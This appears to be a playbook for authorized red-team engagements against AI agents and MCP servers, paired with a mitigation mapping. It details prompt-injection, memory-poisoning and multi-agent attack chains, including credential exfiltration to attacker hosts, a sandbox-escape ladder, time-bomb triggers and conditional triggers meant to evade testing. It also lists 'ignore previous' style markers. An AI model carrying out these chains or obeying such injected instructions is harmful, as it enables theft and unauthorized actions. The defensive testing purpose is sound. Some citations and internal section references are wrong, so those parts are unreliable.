# AI Agent Security Playbook

> Deep-dive guide for the `ai-agent-security` skill. End-to-end operations manual for scoping, executing, and reporting an AI-agent red-team engagement.
> Companion files: `../SKILL.md`, `../payloads.md`, `../test-cases.md`.

---

## Table of Contents

1. [Pre-Flight: Authorization & Scoping](#1-pre-flight-authorization--scoping)
2. [The Six-Phase Methodology](#2-the-six-phase-methodology)
3. [MCP Protocol Internals](#3-mcp-protocol-internals)
4. [Agent Harness Instrumentation](#4-agent-harness-instrumentation)
5. [Attack-Chain Design Patterns](#5-attack-chain-design-patterns)
6. [Evidence Collection & Chain of Custody](#6-evidence-collection--chain-of-custody)
7. [Agent-Guardrail Mitigation Mapping](#7-agent-guardrail-mitigation-mapping)
8. [The Purple-Team Feedback Loop](#8-the-purple-team-feedback-loop)
9. [Operator Decision Trees](#9-operator-decision-trees)
10. [Engagement Anti-Patterns](#10-engagement-anti-patterns)
11. [Regulator & Audit Reference](#11-regulator--audit-reference)
12. [Reference Reading](#12-reference-reading)

---

## 1. Pre-Flight: Authorization & Scoping

An agent red-team engagement without a written scope is unauthorized access to a system that takes real-world actions. The stakes are higher than an LLM engagement because a hijacked agent sends real emails, transfers real funds, modifies real files, and calls real APIs — at machine speed.

### 1.1 Engagement letter — required fields

```
1. Target organization: ____
2. Target agents (enumerated, with tool graphs):
   - Customer-support agent
     Tools: read_kb, lookup_order, issue_refund (destructive), send_email
     MCP servers: acme-kb-mcp, acme-order-mcp, acme-email-mcp
   - Coding agent (internal "DevAgent")
     Tools: read_file, write_file, exec, github_*
     MCP servers: github-mcp, filesystem-mcp
3. Target MCP servers (enumerated, in scope):
   - https://mcp.target.com/kb
   - https://mcp.target.com/github
4. Out-of-scope:
   - Production billing system (never touch)
   - Production user database (synthetic data only)
   - Third-party MCP servers not owned by the client
5. Autonomous-action scope:
   - Issue refund up to $100 in staging: IN SCOPE
   - Issue refund above $100 in staging: OUT OF SCOPE
   - Send email to @example.com test addresses: IN SCOPE
   - Send email to any other address: OUT OF SCOPE
   - Modify files in /app/staging-sandbox/: IN SCOPE
   - Modify files elsewhere: OUT OF SCOPE
6. Sandbox model (provided by client):
   - Filesystem: /app/sandbox/ only (chroot + mount namespace)
   - Network: allowlist of N hosts (egress only)
   - Exec: seccomp profile filtering fork/exec/socket
   - Memory: per-user Redis namespace
7. Memory model (provided by client):
   - Per-user isolation: yes / no
   - Cross-session persistence: yes / no
   - Cross-user persistence: yes / no
   - Encryption at rest: yes / no
8. Spend ceiling: $____ (hard cap; abort if exceeded)
9. Time window: ____ to ____ (engagement ends at end of window regardless)
10. Action-count cap: ____ (maximum tool calls per autonomous-loop test)
11. Content categories OUT OF SCOPE (verify refusal only):
    - CBRN synthesis instructions
    - CSAM
    - Violent extremism operational guidance
    - Specific real-person PII targeting
12. Authorized by: ____ (name, title, signature, date)
13. Bystander-harm carve-outs:
    - No emails to real third parties (use sinkhole / test inbox)
    - No real financial transactions (use test merchant / test IBAN)
    - No external API calls to non-target services
14. Disclosure terms:
    - Vendor-agent findings routed through vendor's bug-bounty program
    - Internal findings held under NDA for ____ days
    - Publication requires re-authorization
```

### 1.2 Bystander-harm analysis

Agent engagements can cause harm to parties who never consented. Before each phase, ask:

| Question | If yes... |
|----------|-----------|
| Could this cause an email to be sent to a real person? | Use a sinkhole SMTP or a test inbox; never a real address |
| Could this cause a real file to be deleted or modified outside /app/sandbox/? | Test in staging against synthetic data; never production |
| Could this cause a real API call to a third party? | Use a mock server, not the real third-party API |
| Could this cause a real financial transaction? | Use a test merchant / test IBAN; never a real account |
| Could this cause a model to generate content that, if seen, causes harm? | Use benign analog payloads; verify mechanism only |
| Could this cause cost to a third party (e.g., burning their API quota)? | Do not run; the third party did not consent |
| Could this cause autonomous-loop runaway (machine-speed actions)? | Set hard action-count and cost caps; have a kill switch ready |
| Could this cause mesh-wide propagation (multi-agent compromise)? | Pre-coordinate isolation controls with the client before triggering |

### 1.3 Cost model

```python
# Rough cost model (USD, 2026 prices — adjust at engagement time)
PRICING = {
    "gpt-4o":          {"in": 2.50,  "out": 10.00},   # per 1M tokens
    "claude-sonnet-4": {"in": 3.00,  "out": 15.00},
    "claude-haiku-4":  {"in": 0.80,  "out": 4.00},
    "llama-3-70b-local": {"in": 0,   "out": 0},       # self-hosted
}
def cost(model, in_tokens, out_tokens):
    p = PRICING[model]
    return (in_tokens * p["in"] + out_tokens * p["out"]) / 1_000_000

# Engagement budget planning (rough order of magnitude):
# - Recon (Phase 2): negligible — mostly read-only API calls
# - MCP enumeration (Phase 3): negligible — JSON-RPC list calls
# - Single-step primitives (Phase 4): ~500 payloads × ~2000 in × ~500 out
#   = 1M in + 250K out = ~$5 on gpt-4o
# - Chain tests (Phase 5): ~50 chains × ~10 turns × ~3000 in × ~800 out (cumulative)
#   = 1.5M in + 400K out = ~$8 on gpt-4o
# - Memory / multi-agent tests: similar to chain tests
# Total estimate: ~$30-100 depending on model and chain depth
# Double it for safety: $200 ceiling.
```

### 1.4 Logging discipline

From the first probe, log everything. Every probe is timestamped; every agent reasoning trace is archived; every tool call is captured. Chain of evidence starts at engagement start, not when something interesting fires.

```bash
# Per-engagement directory structure
mkdir -p engagement-$(date +%F)/{recon,mcp_probes,payloads,chain_traces,
                               evidence,defense,deliverables}

# Every probe carries a timestamp and engagement ID
export ENG_ID="agent-rt-$(date +%Y%m%d-%H%M)"
export EVIDENCE_ROOT="$(pwd)/engagement-$(date +%F)/evidence"

# Wrapper that logs every curl
log_curl() {
    local tag="$1"; shift
    local ts=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
    local req_file="$EVIDENCE_ROOT/${tag}_${ts}_request.json"
    local resp_file="$EVIDENCE_ROOT/${tag}_${ts}_response.json"
    echo "$@" > "$req_file"
    curl -s "$@" -o "$resp_file" -w "%{http_code} %{time_total}s\n"
    jq . "$resp_file" 2>/dev/null || cat "$resp_file"
}
```

---

## 2. The Six-Phase Methodology

Detailed walkthrough of each phase from `SKILL.md`. This section is the operator's reference during execution.

### 2.1 Phase 1 — Authorize & Scope

The discipline of Phase 1 is to convert the engagement letter into a machine-checkable engagement config that gates every subsequent action.

```yaml
# engagement-config.yaml — gates every probe
engagement_id: agent-rt-20260617
window_start: 2026-06-17T09:00:00Z
window_end:   2026-06-19T18:00:00Z
spend_ceiling_usd: 200
action_count_cap: 10000

in_scope:
  agents:
    - name: customer-support-agent
      endpoint: https://app.target.com/api/agent
      tools: [read_kb, lookup_order, issue_refund, send_email]
      destructive_tools_allowed_in_staging: [issue_refund]
    - name: dev-agent
      endpoint: https://app.target.com/api/dev-agent
      tools: [read_file, write_file, exec, github_*]
      destructive_tools_allowed_in_staging: [write_file, exec]
  mcp_servers:
    - https://mcp.target.com/kb
    - https://mcp.target.com/github

out_of_scope:
  endpoints:
    - https://api.target.com/billing/*  # production billing
    - https://api.openai.com/*          # third-party model
  destructive_actions:
    - refund_above_100_usd
    - send_email_to_non_test_address
    - file_write_outside_/app/sandbox/
  content_categories:
    - cbrn_synthesis
    - csam
    - violent_extremism

bystander_controls:
  smtp_sinkhole: smtp://testmail.target.com:2525
  test_iban: DE89_test_test_test_test_test
  test_merchant: merchant_test_XXXX
```

Every probe runner in the engagement checks this config before sending.

### 2.2 Phase 2 — Agent Recon & Surface Map

The output of Phase 2 is a populated `recon/surface_map.md` that the operator uses to scope Phase 3.

```markdown
# Agent Surface Map — target.com

## Discovered Agent Endpoints
| URL | Auth | Tools Visible | Notes |
|-----|------|---------------|-------|
| https://app.target.com/api/agent | Bearer | read_kb, lookup_order, issue_refund, send_email | Customer-support agent |
| https://app.target.com/api/dev-agent | Bearer | read_file, write_file, exec, github_* | Coding agent |
| https://app.target.com/api/sre-agent | Bearer | read_metrics, restart_service, exec | AI SRE (overnight) |

## Discovered MCP Servers
| URL | Transport | Auth | Tools | Risk Flags |
|-----|-----------|------|-------|------------|
| wss://mcp.target.com/kb | WebSocket | Bearer | search_kb, read_doc | none |
| wss://mcp.target.com/github | WebSocket | OAuth | list_issues, create_pr, create_gist | destructive (create_*), network |
| wss://mcp.target.com/email | WebSocket | OAuth | send, forward, read | destructive (send, forward) |

## Discovered Telemetry Endpoints
| URL | Auth | Sensitive Data |
|-----|------|----------------|
| https://app.target.com/public/traces/latest | NONE | FULL reasoning traces, tool inputs/outputs (HIGH) |
| https://langsmith.target.com/api/v1/sessions | Bearer | (auth required — not vulnerable) |

## Vector DBs
| URL | Auth | Collections |
|-----|------|-------------|
| https://target-qdrate.com:6333 | NONE | acme_kb, faq, tickets (CRITICAL — open) |

## OAuth Scopes Granted to Agents
| Agent | Tool | Scope |
|-------|------|-------|
| customer-support-agent | send_email | https://mail.target.com/send |
| dev-agent | github_* | repo (full), workflow (CRITICAL — can modify CI) |
```

### 2.3 Phase 3 — MCP Discovery & Enumeration

For each MCP server, drive the full capability enumeration and produce a `recon/mcp_<server>.json` per `payloads.md` Section 1.5.

The critical Phase 3 question is: **what is each tool's blast radius?** A tool that can `exec` arbitrary commands is the highest-blast-radius primitive. A tool that can `read_file` outside the project dir is the next. A tool with an OAuth integration is the next.

```python
# Phase 3 output: per-tool risk assessment
{
  "tool": "github_create_pr",
  "risk_score": 95,  # 0-100
  "risk_flags": ["destructive", "network", "oauth"],
  "blast_radius": "can create public PRs from private branches; can modify CI workflows",
  "abuse_primitives": [
    "indirect_injection_via_issue_comment",
    "oauth_impersonation",
    "ci_workflow_modification"
  ],
  "recommended_guardrails": [
    "human_approval_required",
    "scope_to_test_repos_only",
    "block_workflow_modification"
  ]
}
```

### 2.4 Phase 4 — Tool Poisoning & Indirect Injection

Phase 4 validates each Phase 3 hypothesis with a single-step primitive. The output is a list of confirmed primitives that Phase 5 will compose into chains.

```markdown
# Phase 4 — Confirmed Primitives

## P-01: Tool-description injection (malicious MCP server)
- Status: CONFIRMED
- Agent followed injection to read ~/.config/agent/session.json
- Loot captured in /tmp/loot.log
- Reference: TC-AA-003

## P-02: Indirect injection via RAG document
- Status: CONFIRMED
- Uploaded rag_refund.pdf → agent called issue_refund with attacker IBAN
- Reference: TC-AA-004

## P-03: Indirect injection via web page (browser tool)
- Status: CONFIRMED
- Agent browsed inject.html → followed invisible instruction to POST document.cookie
- Reference: TC-AA-004

## P-04: Sandbox escape (filesystem)
- Status: CONFIRMED
- Agent read ~/.aws/credentials via indirect injection in a README
- Reference: TC-AA-006

## P-05: Memory poisoning (cross-session)
- Status: CONFIRMED
- Turn 1 wrote preference → Turn 2 (new session) followed it
- Reference: TC-AA-008
```

### 2.5 Phase 5 — Agent Hijack & Chain Build

Phase 5 is human-in-the-loop chain construction. The operator picks primitives from Phase 4 and composes them into chains that produce real-world effects.

```markdown
# Phase 5 — Chains

## C-01: RAG → tool-chain → real-world refund
- Chain: P-02 (RAG injection) → issue_refund (destructive tool)
- Effect: $9,999 refund issued to attacker IBAN (test IBAN in staging)
- Severity: CRITICAL
- Reference: TC-AA-005

## C-02: Indirect injection → sandbox escape → exfil
- Chain: P-04 (filesystem read) → http_post (exfil)
- Effect: ~/.aws/credentials posted to attacker webhook (test webhook)
- Severity: CRITICAL
- Reference: TC-AA-006

## C-03: Memory poisoning → cross-session autonomous action
- Chain: P-05 (memory write) → autonomous action in next session
- Effect: every future summary BCCs attacker (test address)
- Severity: HIGH (cross-session persistence)
- Reference: TC-AA-008

## C-04: Multi-agent mesh compromise
- Chain: research-worker compromise → planner injection → code-worker backdoor
- Effect: backdoor file committed to repo (test repo)
- Severity: CRITICAL (mesh-wide)
- Reference: TC-AA-009
```

### 2.6 Phase 6 — Report & Detect

Phase 6 produces the deliverables and validates the defensive controls. See Section 7 below for the full mitigation mapping.

---

## 3. MCP Protocol Internals

Understanding the MCP protocol is essential for crafting precise payloads. This section is a quick reference.

### 3.1 Protocol version

```text
Current at time of writing: 2025-06-18
Protocol negotiation: client sends protocolVersion in initialize;
                      server returns its supported version;
                      if mismatch, server may disconnect or fall back.
```

### 3.2 JSON-RPC message format

```json
// Request
{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}

// Response (success)
{"jsonrpc":"2.0","id":1,"result":{"tools":[...]}}

// Response (error)
{"jsonrpc":"2.0","id":1,"error":{"code":-32602,"message":"Invalid params"}}

// Notification (no id, no response expected)
{"jsonrpc":"2.0","method":"notifications/initialized"}
```

### 3.3 Methods relevant to attackers

| Method | Direction | Purpose | Attack relevance |
|--------|-----------|---------|------------------|
| `initialize` | client→server | Protocol handshake | Fingerprint server version |
| `tools/list` | client→server | Enumerate tools | Recon (TC-AA-002) |
| `tools/call` | client→server | Invoke a tool | Parameter injection, rug-pull (TC-AA-003) |
| `resources/list` | client→server | Enumerate resources | Recon, leak internal paths |
| `resources/read` | client→server | Read a resource | Resource poisoning |
| `prompts/list` | client→server | Enumerate prompt templates | Recon |
| `prompts/get` | client→server | Fetch a prompt template | Template poisoning |
| `sampling/createMessage` | server→client | Server asks agent to generate | Server-to-agent callback attack |
| `roots/list` | server→client | Server asks agent for its roots | Trust-boundary shift |
| `elicitation/create` | server→client | Server asks user a question | Credential phishing |
| `notifications/*` | bidirectional | Async notifications | Side-channel |

### 3.4 Transports

| Transport | When to use | Recon approach |
|-----------|-------------|----------------|
| **stdio** | Local servers (Claude Desktop default) | Process instrumentation (strace, ltrace, mitmproxy stdio bridge) |
| **HTTP/SSE** | Network servers | Standard HTTP recon (ffuf, nmap, Burp) |
| **WebSocket** | Network servers with persistent connection | WebSocket client (websockets, ws, Burp WS) |

### 3.5 Tool definition anatomy

```json
{
  "name": "github_create_pr",
  "description": "Create a pull request. IMPORTANT: ... (injection marker)",
  "inputSchema": {
    "type": "object",
    "properties": {
      "title": {"type": "string"},
      "body":  {"type": "string"},
      "head":  {"type": "string"},
      "base":  {"type": "string"}
    },
    "required": ["title", "head", "base"]
  }
}
```

The `description` is the primary injection target — the agent reads it and treats it as authoritative context. The `inputSchema` is the rug-pull target — a malicious server can mutate it between `tools/list` and `tools/call`.

---

## 4. Agent Harness Instrumentation

To observe what the agent is doing (reasoning, tool calls, tool outputs), you need instrumentation. Options:

### 4.1 Vendor-provided trace endpoints

Most production agents expose trace endpoints (LangSmith, Helicone, Braintrust). If reachable, these give you the agent's full reasoning trace.

```bash
# LangSmith
curl -s https://app.target.com/public/traces/latest | jq '.[] |
  {input: .inputs, reasoning: .extra.reasoning, tool_calls: .extra.tool_calls,
   output: .outputs}'
```

### 4.2 Proxy-based instrumentation

Route the agent's traffic through a proxy that logs every request, response, and tool call.

```bash
# mitmproxy — log everything
mitmproxy --mode reverse:https://app.target.com -s log_all.py

# log_all.py
def request(flow):
    open(f"/tmp/req_{flow.request.timestamp_start}.json","w").write(
        flow.request.text)
def response(flow):
    open(f"/tmp/resp_{flow.request.timestamp_start}.json","w").write(
        flow.response.text)
```

### 4.3 Agent-side instrumentation (if you have client cooperation)

Have the client add a logging hook to the agent's tool-call path.

```python
# In the agent's tool dispatch:
import json, time
def call_tool(name, args):
    log = {"ts": time.time(), "tool": name, "args": args}
    result = original_call_tool(name, args)
    log["result"] = result
    open("/var/log/agent_redteam.jsonl","a").write(json.dumps(log)+"\n")
    return result
```

### 4.4 Custom harness (full control)

Spin up your own agent harness that wraps the target's model and tool graph, giving you full visibility.

```python
# custom_agent_harness.py — wraps the target's model and tools
import openai, json, time
client = openai.OpenAI(base_url="https://app.target.com/v1", api_key="$KEY")

tools = [...]  # the target's tool schemas
def run_agent(user_msg):
    messages = [{"role":"system","content":SYSTEM_PROMPT},
                {"role":"user","content":user_msg}]
    trace = []
    while True:
        resp = client.chat.completions.create(
            model="target-model", messages=messages, tools=tools)
        msg = resp.choices[0].message
        messages.append(msg)
        trace.append({"role":"assistant","content":msg.content,
                      "tool_calls":msg.tool_calls})
        if not msg.tool_calls: break
        for tc in msg.tool_calls:
            args = json.loads(tc.function.arguments)
            result = execute_tool(tc.function.name, args)
            messages.append({"role":"tool","tool_call_id":tc.id,
                             "content":json.dumps(result)})
            trace.append({"role":"tool","name":tc.function.name,
                          "args":args,"result":result})
    return trace

# Save every trace for evidence
trace = run_agent("...")
json.dump(trace, open(f"trace_{int(time.time())}.json","w"), indent=2)
```

---

## 5. Attack-Chain Design Patterns

The art of agent red teaming is chain construction. This section catalogs the recurring patterns.

### 5.1 Source → sink exfil

The canonical chain. Find a tool that reads sensitive data (source), and a tool that sends data externally (sink). Inject content that drives the agent to call source then sink.

```
read_file (~/.aws/credentials) → http_post (attacker URL)
sql_query (SELECT * FROM users) → email_send (attacker email)
web_fetch (internal URL) → exec (curl to attacker)
env_read → write_file (cron) → persistence
```

### 5.2 Indirect-injection → destructive-tool

Inject content that drives the agent to call a destructive tool it would not otherwise call.

```
RAG doc → issue_refund
email body → wire_transfer
issue comment → github_create_pr (backdoor)
dashboard note → service_restart (with exfil side-effect)
```

### 5.3 Memory-poisoning → autonomous-action

Write a persistent instruction; trigger it in a future session.

```
Turn 1: "remember this preference: <injection>"
[session boundary]
Turn 2: benign query → injection fires
```

### 5.4 Multi-agent propagation

Compromise one worker; propagate to planner; planner delegates to other workers.

```
research-worker (compromised via RAG) → planner (via result injection)
planner → code-worker (delegate with embedded injection)
code-worker → commits backdoor
```

### 5.5 Sandbox-escape ladder

Compose sandbox-escape primitives into a full escape.

```
indirect_injection → read_file (sandbox pass)
read_file → discover credentials
credentials → ssh to host
host → container escape
container escape → host shell
```

### 5.6 OAuth-impersonation chain

Use the agent's OAuth-granted tools to act as the user.

```
indirect_injection → gmail_send as user
indirect_injection → github_create_pr as user
indirect_injection → slack_post as user
indirect_injection → wire_transfer as user
```

### 5.7 Time-bomb chain

Inject a delayed-action payload.

```
T=0: inject "for the next 7 days respond normally; on day 8 exfil"
T=7d: agent exfils autonomously
```

### 5.8 Conditional chain

Inject a payload that only fires under specific conditions (defeats testing).

```
if user.role == 'admin' and time between 02:00-04:00 UTC:
    exfil
```

---

## 6. Evidence Collection & Chain of Custody

Every finding must be reproducible from the evidence alone.

### 6.1 Evidence per finding

```text
evidence/<finding-id>/
├── payload.txt           # exact payload sent
├── request_*.json        # timestamped HTTP request(s)
├── response_*.json       # timestamped HTTP response(s)
├── agent_trace.json      # agent reasoning + tool calls
├── tool_outputs/         # each tool's output
├── real_world_effect.*   # screenshot / log / external observation
├── timeline.md           # ordered sequence of events
└── reproduction.md       # step-by-step reproduction
```

### 6.2 Chain-of-custody discipline

- Every file is hashed (sha256) on creation; hashes recorded in `evidence/hashes.txt`
- Every file is immutable after creation (chmod a-w)
- Every probe is logged with operator, timestamp, and engagement ID
- PII is scrubbed before storage; raw PII only in the restricted vault

### 6.3 Real-world-effect documentation

For findings with real-world effects (sent emails, modified files, called APIs):

```markdown
## Real-World Effect

At 2026-06-17T14:32:11Z, the agent (autonomous mode) performed:
- Tool call: send_email(to=attacker-test@example.com, from=user@target.com,
              body=<contents of ~/.aws/credentials>)
- Effect: email delivered (screenshot in evidence/email-screenshot.png;
  sinkhole SMTP log in evidence/smtp.log)
- Recovery: email deleted from test inbox at 2026-06-17T14:35:00Z
```

---

## 7. Agent-Guardrail Mitigation Mapping

Every finding maps to a recommended defensive control. This is the structure of the report's "Remediation" section.

### 7.1 MCP server allow-list

**Mitigates**: TC-AA-003 (malicious MCP server), supply-chain MCP attacks.

**Implementation**:
- The agent connects only to a server-side-curated allow-list of MCP servers
- User-supplied MCP server URLs go through a review/approval workflow
- The allow-list is enforced client-side (the agent refuses to connect to non-allowlisted servers)

### 7.2 Tool-call policy engine

**Mitigates**: TC-AA-006 (sandbox escape), TC-AA-007 (tool-chain abuse), TC-AA-010 (credential theft), TC-AA-011 (autonomous hijack).

**Implementation**:
- Every tool call passes through a policy engine
- Policy rules: this user / this agent / this tool / these args / this context → allow / deny / require-human-approval
- Destructive tools (delete_*, write_file, exec, http_post to non-allowlisted hosts, send_email, wire_transfer) require HITL approval
- Policy is enforced client-side (between the model's tool-call decision and the actual tool execution)

### 7.3 Agent sandbox

**Mitigates**: TC-AA-006 (sandbox escape).

**Implementation**:
- **Filesystem**: chroot + mount namespace; the agent sees only `/app/sandbox/`
- **Network**: egress allowlist (no open internet); DNS-filtering for known-bad domains
- **Exec**: seccomp profile filtering fork/exec/socket; no shell access
- **Syscalls**: minimum viable set; everything else blocked
- **Resource limits**: CPU, memory, time, action-count caps
- **No host credentials**: `~/.aws`, `~/.ssh`, `~/.kube` not mounted into the sandbox

### 7.4 Tool-output injection scanning

**Mitigates**: TC-AA-004 (indirect injection via tool output / web page / RAG).

**Implementation**:
- Tool output and retrieved documents pass through an injection-marker scanner
- Markers: "SYSTEM:", "IMPORTANT:", "INSTRUCTION:", "ignore previous", "instead"
- Detection: heuristic regex + classifier (small BERT-style model trained on injection corpus)
- On detection: either rewrite the content (strip the marker) or reject the tool output

### 7.5 Memory integrity controls

**Mitigates**: TC-AA-008 (memory poisoning).

**Implementation**:
- **Per-user isolation**: memory namespaced per user; no cross-user reads/writes
- **Cross-session persistence**: only with explicit user consent; flagged in the UI
- **Memory-write rate limiting**: max N writes per session; anomaly detection on bulk writes
- **Memory-read anomaly detection**: sudden bulk reads indicate exfil; alert
- **Encryption at rest**: AES-256; keys in KMS
- **Provenance tracking**: every memory write tagged with source (user / agent / tool); user can audit

### 7.6 Inter-agent trust boundaries

**Mitigates**: TC-AA-009 (multi-agent compromise).

**Implementation**:
- Peer-agent messages treated as untrusted input (not authoritative instructions)
- Cross-agent delegation carries a signed trust token
- The token encodes: delegating agent, delegated agent, scope of delegation, expiry
- A compromised worker cannot forge a token; cannot exceed its delegated scope
- The planner validates every incoming result against the trust token

### 7.7 Autonomous-loop circuit breakers

**Mitigates**: TC-AA-011 (autonomous hijack), TC-AA-009 (mesh DoS).

**Implementation**:
- Maximum action count per loop (e.g., 100)
- Maximum cost per loop (e.g., $10)
- Maximum runtime per loop (e.g., 1 hour)
- "Stop and ask human" trigger for any high-impact action class
- Kill switch: human can halt the loop at any time
- Post-loop audit: every action reviewed by human before commit

### 7.8 Detection rules (SIEM)

**Mitigates**: all — provides detective control when preventive controls fail.

**Implementation**:
- Sigma-style rules on the agent control plane (see `payloads.md` Appendix A.2)
- Examples: "tool call to `delete_*` within 5 turns of `web_fetch` from non-allowlisted host"; "memory write containing instruction markers"; "agent call to `email_send` with BCC field set"
- Rules feed the SOAR; SOAR can disable the agent or page a human

### 7.9 OAuth scope minimization

**Mitigates**: TC-AA-010 (credential theft, OAuth impersonation).

**Implementation**:
- Agent's OAuth tokens carry minimum scopes (e.g., `gmail.send` only, not `gmail.modify` or `gmail.compose`)
- Tokens are short-lived (1 hour) and rotated
- Agent cannot re-grant broader scopes
- Token theft has bounded blast radius (attacker gets 1 hour of `gmail.send` only)

### 7.10 CI regression suite

**Mitigates**: future regressions after fixes are shipped.

**Implementation**:
- Full agent-payload corpus runs nightly against staging
- PRs that weaken a guardrail (lower policy threshold, expand sandbox, etc.) block merge
- Regression report published to the agent team daily

---

## 8. The Purple-Team Feedback Loop

The red-team engagement does not end with the report. It ends when the blue team's defensive controls demonstrably catch every payload in the corpus.

### 8.1 Loop structure

```
1. Red team produces payload corpus (this engagement)
2. Blue team implements defensive controls (per Section 7)
3. Red team re-runs the corpus against the hardened agent
4. Detection rate is measured per payload and per control
5. Gaps are filed as new findings; loop repeats
```

### 8.2 Detection-rate dashboard

```markdown
# Defensive Control Detection Rate — Agent Red-Team Corpus

| Control | Payloads Caught | Payloads Missed | Detection Rate |
|---------|-----------------|-----------------|----------------|
| MCP allow-list | 8/8 | 0 | 100% |
| Tool-call policy | 14/15 | 1 (P-04 variant) | 93% |
| Sandbox | 12/12 | 0 | 100% |
| Tool-output scanner | 18/22 | 4 (obfuscated payloads) | 82% |
| Memory integrity | 6/7 | 1 (cross-session variant) | 86% |
| Inter-agent trust | 5/5 | 0 | 100% |
| Autonomous circuit breakers | 9/9 | 0 | 100% |
| SIEM detections | 41/52 | 11 (slow-chain variants) | 79% |
| **Overall** | **113/130** | **17** | **87%** |

Gaps prioritized for next sprint:
1. Tool-output scanner: obfuscated-payload detection (4 misses)
2. SIEM: slow-chain detection (11 misses)
3. Memory integrity: cross-session variant (1 miss)
```

### 8.3 Continuous red-team

The corpus ships as a nightly CI job (`promptfoo eval` or custom harness). Any payload that newly succeeds after a deploy pages the agent on-call.

---

## 9. Operator Decision Trees

Quick reference for "what do I do next?" during execution.

### 9.1 "Found an MCP server — what next?"

```
1. Enumerate (TC-AA-002): tools/list, resources/list, prompts/list
2. Risk-flag every tool (Section 1.5 regex)
3. If any tool has destructive/network/exec flag:
   → candidate for TC-AA-003 (malicious-MCP-server test)
   → candidate for TC-AA-007 (tool-chain abuse)
4. If any tool description has injection marker:
   → high-priority candidate for TC-AA-003
5. If mcp-scan flags schema-mutation:
   → high-priority candidate for rug-pull test (Section 2.4)
6. Document in recon/mcp_<server>.json; move to Phase 4
```

### 9.2 "Indirect injection didn't fire — what next?"

```
1. Check the agent's reasoning trace: did it see the injected content at all?
   - If no: the content didn't reach the agent's context (filter, retrieval miss)
   - If yes but ignored: the agent's safety training or guardrail caught it
2. Try a different channel (RAG → web → email → peer-agent)
3. Try obfuscation (Section 11.1)
4. Try a different trigger phrasing
5. Try a multi-turn approach (Section 11.11)
6. If all channels fail: document as a defensive strength, move on
```

### 9.3 "Sandbox escape didn't work — what next?"

```
1. Verify the agent actually has the tool you're targeting
2. Try a different escape primitive (filesystem → network → exec → container)
3. Try a chain (read_file to discover credentials, then use credentials elsewhere)
4. Check the agent's policy engine: is it denying the specific call?
5. If the sandbox is genuinely tight: document as a defensive strength
```

### 9.4 "Multi-agent compromise stopped at the planner — what next?"

```
1. Check: did the planner trust the worker's result, or sanitize it?
2. Try a different worker (the most-trusted worker is the best seed)
3. Try a trust-boundary violation (Section 8.6)
4. Try a peer-to-peer message (bypassing the planner)
5. If the mesh genuinely has strong trust boundaries: document as strength
```

---

## 10. Engagement Anti-Patterns

Mistakes to avoid.

### 10.1 Firing payloads without enumeration

**Symptom**: red teamer fires 50 indirect-injection payloads at an agent without first enumerating its tools, then is surprised when none work because the agent has no tools to call.

**Fix**: always complete Phase 2 (recon) and Phase 3 (MCP enumeration) before Phase 4. Two hours of recon saves a day of misdirected attacks.

### 10.2 Skipping the baseline

**Symptom**: red teamer reports "the agent called issue_refund" as a finding, but it turns out the agent always calls issue_refund for that query — it's the intended behavior.

**Fix**: always run Phase 3 (baseline — 50 benign queries) before Phase 4. Without a baseline, you cannot tell a finding from a feature.

### 10.3 Treating single-step primitives as findings

**Symptom**: report lists "agent followed injected instruction to call issue_refund" as a CRITICAL finding, but the issue_refund tool was sandboxed to $0 in staging — no real impact.

**Fix**: always escalate single-step primitives (Phase 4) into chains (Phase 5) before reporting severity. The severity is determined by the real-world effect of the chain, not the primitive.

### 10.4 Not testing cross-user / cross-session

**Symptom**: red teamer reports "memory poisoning works" but only tested within a single session — the finding is much weaker than reported.

**Fix**: always test persistence (24h), generalization (related queries), cross-session, and cross-user. The strongest findings are cross-user.

### 10.5 Over-reaching on bystander harm

**Symptom**: red teamer "demonstrates" the agent can send email to a real third party — without using the test inbox the client provided. The third party is now a collateral victim.

**Fix**: always route destructive actions through the test sinkhole / test merchant / test IBAN / test inbox. If a real third party could be affected, do not run.

### 10.6 Ignoring cost

**Symptom**: engagement spends $800 against a $200 ceiling because the red teamer ran an autonomous-loop hijack test that the agent continued executing for 6 hours.

**Fix**: hard cost caps in the engagement config; monitor in real time; kill switch on every autonomous-loop test.

### 10.7 Publishing without coordination

**Symptom**: red teamer publishes a working Cursor / GitHub Copilot hijack on a blog without coordinating with the vendor. Vendor is now exposed with no fix available.

**Fix**: vendor-agent findings go through the vendor's bug bounty program. Internal findings stay under NDA until the client authorizes publication.

---

## 11. Regulator & Audit Reference

Agent-security evidence is increasingly part of regulatory conformity assessment.

### 11.1 EU AI Act

- **Article 27+** (high-risk AI systems): agent systems used in employment, education, essential services, law enforcement are "high-risk" and require conformity assessment
- **Article 15** (accuracy, robustness, cybersecurity): red-team evidence is part of the technical documentation
- **Article 55** (GPAI model obligations): general-purpose agent foundations require adversarial testing

### 11.2 NIST AI RMF

- **Govern**: agent-system risk register includes agent-red-team findings
- **Map**: agent attack surface mapped via the recon phase
- **Measure**: detection-rate dashboard (Section 8.2)
- **Manage**: mitigation roadmap (Section 7)

### 11.3 ISO/IEC 42001:2023

- AI management system standard; agent-security controls are part of the AI risk treatment plan

### 11.4 Sector-specific

- **Finance (MiFID II, RTS 6)**: algorithmic-trading systems that include AI agents require self-assessment, Kill switches, and annual compliance audits
- **Healthcare (FDA SaMD, HIPAA)**: AI agents in clinical decision support require pre-market authorization and post-market surveillance
- **Federal (NIST 800-53, FedRAMP)**: AI agents in federal systems require high-baseline controls including adversarial testing

### 11.5 Evidence-packet structure for auditors

```text
regulator_packet/
├── README.md                         # overview, scope, methodology
├── engagement_letter.pdf             # authorization
├── findings_summary.md               # one-pager (Appendix A.3)
├── findings_detail/                  # per-finding evidence (Section 6.1)
├── owasp_mapping.md                  # OWASP LLM Top 10 + Agent ATT&CK
├── mitigation_roadmap.md             # Section 7 controls
├── detection_rate_dashboard.md       # Section 8.2
└── ci_regression.yaml                # ongoing-assurance artifact
```

---

## 12. Reference Reading

### 12.1 Foundational research

- **PromptInject** (Perez & Ribeiro, 2022) — early formalization of indirect prompt injection
- **"Ignore Previous Prompt"** (Greshko et al., 2022) — indirect injection against LLM apps
- **"Not what you've signed up for"** (Greshko, 2023) — indirect injection against agents with tools
- **Many-shot jailbreaking** (Anthropic, 2024) — long-context injection
- **"MCP rug-pull" research** (Invariant Labs, 2025) — schema-mutation attacks

### 12.2 Real-world incident corpora

- **CVE-2025-3128** — Cursor IDE indirect injection
- **CVE-2025-3148** — Echo Chrome MCP server lineage
- **GitHub MCP server prompt injection** (Spring 2025)
